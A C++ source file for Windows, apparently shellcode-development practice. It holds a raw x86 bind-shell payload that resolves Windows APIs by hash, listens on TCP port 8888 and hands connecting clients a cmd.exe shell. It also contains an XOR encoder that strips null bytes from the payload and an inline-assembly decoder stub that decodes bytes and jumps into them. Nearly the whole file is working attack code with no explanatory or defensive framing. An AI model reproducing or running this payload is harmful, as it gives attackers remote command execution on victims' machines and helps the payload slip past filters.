#define _CRT_SECURE_NO_WARNINGS 1
#include <Windows.h>
#include <iostream>

char shellcode[] = "\x60\x8B\xEC\x83\xEC\x30\xC6\x45\xFF\x00\xC7\x45\xFB\x2E\x64\x6C\x6C\xC7\x45\xF7\x65\x6C\x33\x32\xC7\x45\xF3\x6B\x65\x72\x6E\xC6\x45\xF2\x00\x66\xC7\x45\xF0\x6C\x6C\xC7\x45\xEC\x33\x32\x2E\x64\xC7\x45\xE8\x77\x73\x32\x5F\xC7\x45\xE4\x65\x78\x65\x00\xC7\x45\xE0\x63\x6D\x64\x2E\x8D\x5D\xE0\x53\x8D\x5D\xE8\x53\x8D\x5D\xF3\x53\xE8\xD3\x00\x00\x00\x83\xC4\x14\x83\xC4\x30\x8B\xE5\x61\xC3\x55\x8B\xEC\x83\xEC\x0C\x56\x64\x8B\x35\x30\x00\x00\x00\x8B\x76\x0C\x8B\x76\x1C\x8B\x36\x8B\x76\x08\x8B\xC6\x8B\xE5\x5D\xC3\x55\x8B\xEC\x83\xEC\x10\x56\x57\x52\x53\x51\x8B\x55\x08\x8B\x72\x3C\x8D\x34\x32\x8B\x76\x78\x8D\x34\x32\x8B\x7E\x1C\x8D\x3C\x3A\x89\x7D\xFC\x8B\x7E\x20\x8D\x3C\x3A\x89\x7D\xF8\x8B\x7E\x24\x8D\x3C\x3A\x89\x7D\xF4\x33\xDB\xFC\xEB\x01\x43\x8B\x75\xF8\x8B\x34\x9E\x8D\x34\x32\x56\xE8\x24\x00\x00\x00\x8B\x7D\x0C\x3B\xC7\x75\xE9\x8B\x75\xF4\x33\xFF\x66\x8B\x3C\x5E\x8B\x75\xFC\x8B\x34\xBE\x8D\x04\x32\x59\x5B\x5A\x5F\x5E\x8B\xE5\x5D\xC2\x0C\x00\x55\x8B\xEC\x83\xEC\x10\x53\x52\x56\xC7\x45\xFC\x00\x00\x00\x00\x8B\x75\x08\x33\xC0\x8A\x06\x84\xC0\x74\x16\x8B\x5D\xFC\xC1\xE3\x19\x8B\x55\xFC\xC1\xEA\x07\x0B\xDA\x03\xD8\x89\x5D\xFC\x46\xEB\xE4\x8B\xC3\x5E\x5A\x5B\x8B\xE5\x5D\xC2\x04\x00\x55\x8B\xEC\x81\xEC\x00\x03\x00\x00\x51\x53\x52\x56\x57\xE8\x24\xFF\xFF\xFF\x89\x45\xFC\x68\x87\x32\xD8\xC0\x50\xE8\x35\xFF\xFF\xFF\x89\x45\xF8\x6A\x00\x6A\x00\xFF\x75\x08\xFF\x55\xF8\x89\x45\xF4\x6A\x00\x6A\x00\xFF\x75\x0C\xFF\x55\xF8\x89\x45\xF0\x68\x3D\x6A\xB4\x80\xFF\x75\xF0\xE8\x0B\xFF\xFF\xFF\x8D\xB5\x00\xFD\xFF\xFF\x56\x68\x20\x20\x00\x00\xFF\xD0\x68\x2D\x32\x78\xDE\xFF\x75\xF0\xE8\xF0\xFE\xFF\xFF\x6A\x00\x6A\x00\x6A\x00\x6A\x06\x6A\x01\x6A\x02\xFF\xD0\x89\x45\xEC\x68\x64\x10\xA7\xDD\xFF\x75\xF0\xE8\xD2\xFE\xFF\xFF\x66\xC7\x85\x00\xFD\xFF\xFF\x02\x00\x66\xC7\x85\x02\xFD\xFF\xFF\x22\xB8\xC7\x85\x04\xFD\xFF\xFF\x00\x00\x00\x00\x6A\x10\x8D\xB5\x00\xFD\xFF\xFF\x56\xFF\x75\xEC\xFF\xD0\x68\x0C\x9F\xD3\x4B\xFF\x75\xF0\xE8\x9B\xFE\xFF\xFF\x68\xFF\xFF\xFF\x7F\xFF\x75\xEC\xFF\xD0\x68\xB1\x1E\x97\x01\xFF\x75\xF0\xE8\x84\xFE\xFF\xFF\x6A\x00\x6A\x00\xFF\x75\xEC\xFF\xD0\x89\x45\xEC\x8D\xBD\x70\xFF\xFF\xFF\x33\xC0\xB9\x11\x00\x00\x00\xFC\xF3\xAB\xC7\x85\x70\xFF\xFF\xFF\x44\x00\x00\x00\xC7\x45\x9C\x00\x01\x00\x00\x8B\x75\xEC\x89\x75\xA8\x89\x75\xAC\x89\x75\xB0\x68\xC9\xBC\xA6\x6B\xFF\x75\xF4\xE8\x3E\xFE\xFF\xFF\x8D\x95\x00\xFE\xFF\xFF\x52\x8D\xB5\x70\xFF\xFF\xFF\x56\x6A\x00\x6A\x00\x6A\x00\x6A\x01\x6A\x00\x6A\x00\xFF\x75\x10\x6A\x00\xFF\xD0\x5F\x5E\x5A\x5B\x59\x8B\xE5\x5D\xC3";
int codeLen = 0x26B;

BOOL EncodeShell(const char* code, int len)
{
	int encodeKey;
	BOOL flag = TRUE;
	unsigned char* codeBuff = new unsigned char[0x26B];
	for (int key = 0; key < 0xff; key++)
	{
		flag = TRUE;
		for (int i = 0; i < codeLen; i++)
		{
			codeBuff[i] = code[i] ^ key;
			if (codeBuff[i] == 0) {
				flag = FALSE;
				break;
			}
		}
		if (flag)
		{
			encodeKey = key;
			break;
		}
	}
	if (!flag)
	{
		return FALSE;
	}
	FILE* fp = fopen("encode.txt", "w+");
	fprintf(fp, "encodeKey = 0x%0.2X\n", encodeKey);
	fprintf(fp, "\"");
	for (int i = 0; i < len; i++)
	{
		fprintf(fp, "\\x%0.2X", codeBuff[i]);
		if ((i + 1) % 20 == 0)
		{
			fprintf(fp, "\n");
		}
	}
	fprintf(fp, "\"");
	//delete[] fp;
	return 0;

}
int main(void)
{
	//EncodeShell(shellcode, codeLen);
	printf("hello\n");
	_asm
	{
		xor eax,eax
		call tag_get_eip-1
		tag_get_eip:
		ret
		pop eax
		lea esi, [eax + 0x1A]
		xor ecx, ecx
		mov cx,0x26A
		tag_loop:
		mov al,[esi+ecx]
		xor al,0x5
		mov [esi+ecx],al
		loop tag_loop
		xor [esi],0x5
		jmp esi
	}
	return 0;
}
